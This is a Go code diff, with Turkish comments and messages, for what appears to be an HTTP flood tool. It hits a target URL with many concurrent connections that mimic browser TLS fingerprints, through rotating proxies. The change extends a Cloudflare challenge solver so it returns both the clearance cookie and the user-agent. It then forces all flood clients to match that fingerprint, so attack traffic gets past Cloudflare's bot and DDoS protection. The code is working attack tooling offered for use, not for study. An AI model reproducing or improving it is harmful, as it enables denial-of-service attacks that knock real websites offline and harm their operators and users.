@@ -73,16 +73,17 @@ func main() {
 
 	// Solve Cloudflare challenge if --solve flag is set
 	var solvedCookies string
+	var solvedUA string
 	if solve {
 		var err error
-		solvedCookies, err = solveCFChallenge(targetURL)
+		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "hata: challenge cozulemedi: %v\n", err)
 			os.Exit(1)
 		}
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies)
+	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA)
 }
 
 // solverResult is the JSON output from solver/index.js
@@ -94,8 +95,8 @@ type solverResult struct {
 	Error     string `json:"error"`
 }
 
-// solveCFChallenge runs the Node.js solver to get cf_clearance cookie.
-func solveCFChallenge(targetURL string) (string, error) {
+// solveCFChallenge runs the Node.js solver to get cf_clearance cookie and user-agent.
+func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
 	fmt.Println("cloudflare challenge cozuluyor...")
 
 	// Find solver script relative to executable or cwd
@@ -112,12 +113,12 @@ func solveCFChallenge(targetURL string) (string, error) {
 		}
 	}
 	if solverPath == "" {
-		return "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
+		return "", "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
 	}
 
 	// Check if node_modules exists
-	if _, err := os.Stat("solver/node_modules"); os.IsNotExist(err) {
-		return "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
+	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
+		return "", "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
@@ -125,30 +126,33 @@ func solveCFChallenge(targetURL string) (string, error) {
 
 	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
 	cmd.Stderr = os.Stderr
-	output, err := cmd.Output()
-	if err != nil {
-		return "", fmt.Errorf("solver calistirilamadi: %w", err)
+	output, errCmd := cmd.Output()
+	if errCmd != nil {
+		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
 	}
 
 	var result solverResult
-	if err := json.Unmarshal(output, &result); err != nil {
-		return "", fmt.Errorf("solver ciktisi okunamadi: %w\ncikti: %s", err, string(output))
+	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
+		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w\ncikti: %s", errJSON, string(output))
 	}
 
 	if result.Status == "error" {
-		return "", fmt.Errorf("solver hatasi: %s", result.Error)
+		return "", "", fmt.Errorf("solver hatasi: %s", result.Error)
 	}
 
 	if result.Cookies == "" {
-		return "", fmt.Errorf("solver cookie dondurmedi (status: %s)", result.Status)
+		return "", "", fmt.Errorf("solver cookie dondurmedi (status: %s)", result.Status)
 	}
 
 	fmt.Printf("challenge cozuldu! status: %s\n", result.Status)
+	if result.UserAgent != "" {
+		fmt.Printf("user-agent: %s\n", result.UserAgent)
+	}
 	if result.Status == "no_clearance" {
 		fmt.Println("uyari: cf_clearance cookie bulunamadi, mevcut cookie'ler kullanilacak")
 	}
 
-	return result.Cookies, nil
+	return result.Cookies, result.UserAgent, nil
 }
 
 // clientGroup holds multiple clients of the same browser type for connection multiplying.
@@ -175,7 +179,7 @@ func (cg *clientGroup) ActiveConnections() int64 {
 	return total
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies string) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	// Scale total connections with thread count for higher RPS.
@@ -244,23 +248,38 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		clients int
 	}
 
-	safariClients := totalTargetClients * 4 / 10
-	chromeClients := totalTargetClients * 3 / 10
-	firefoxClients := totalTargetClients - safariClients - chromeClients
-	if safariClients < 2 {
-		safariClients = 2
-	}
-	if chromeClients < 1 {
-		chromeClients = 1
-	}
-	if firefoxClients < 1 {
-		firefoxClients = 1
-	}
+	var browsers []browserSpec
 
-	browsers := []browserSpec{
-		{"firefox", gofire.Firefox148, firefoxClients},
-		{"chrome", gofire.Chrome146, chromeClients},
-		{"safari", gofire.SafariIOS18, safariClients},
+	if solvedCookies != "" {
+		// When using solved cookies, ALL clients must be Chrome with solver's UA.
+		// cf_clearance is bound to User-Agent + TLS fingerprint.
+		// Solver uses Chrome, so all blaze clients must match.
+		browsers = []browserSpec{
+			{"chrome", gofire.Chrome146, totalTargetClients},
+		}
+		if solvedUA != "" {
+			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
+		}
+		fmt.Printf("cf-bypass: tum clientlar chrome (solver UA ile)\n")
+	} else {
+		// Normal mode: 40% Safari, 30% Chrome, 30% Firefox
+		safariClients := totalTargetClients * 4 / 10
+		chromeClients := totalTargetClients * 3 / 10
+		firefoxClients := totalTargetClients - safariClients - chromeClients
+		if safariClients < 2 {
+			safariClients = 2
+		}
+		if chromeClients < 1 {
+			chromeClients = 1
+		}
+		if firefoxClients < 1 {
+			firefoxClients = 1
+		}
+		browsers = []browserSpec{
+			{"firefox", gofire.Firefox148, firefoxClients},
+			{"chrome", gofire.Chrome146, chromeClients},
+			{"safari", gofire.SafariIOS18, safariClients},
+		}
 	}
 
 	groups := make([]*clientGroup, len(browsers))
@@ -319,10 +338,16 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	actualWorkers := workersPerClient * totalClients
 	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
 		targetURL, durSec, actualWorkers, workersPerClient, method)
-	fmt.Printf("browser: %d safari(40%%) + %d chrome(30%%) + %d firefox(30%%) client (toplam %d baglanti)\n",
-		safariClients, chromeClients, firefoxClients, totalClients)
 	if solvedCookies != "" {
-		fmt.Println("mode: cf-bypass (cookie injected)")
+		fmt.Printf("browser: %d chrome client (cf-bypass mode, toplam %d baglanti)\n",
+			totalClients, totalClients)
+	} else {
+		var bCounts []string
+		for _, bs := range browsers {
+			bCounts = append(bCounts, fmt.Sprintf("%d %s", bs.clients, bs.name))
+		}
+		fmt.Printf("browser: %s (toplam %d baglanti)\n",
+			strings.Join(bCounts, " + "), totalClients)
 	}
 	if proxyRotator != nil {
 		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
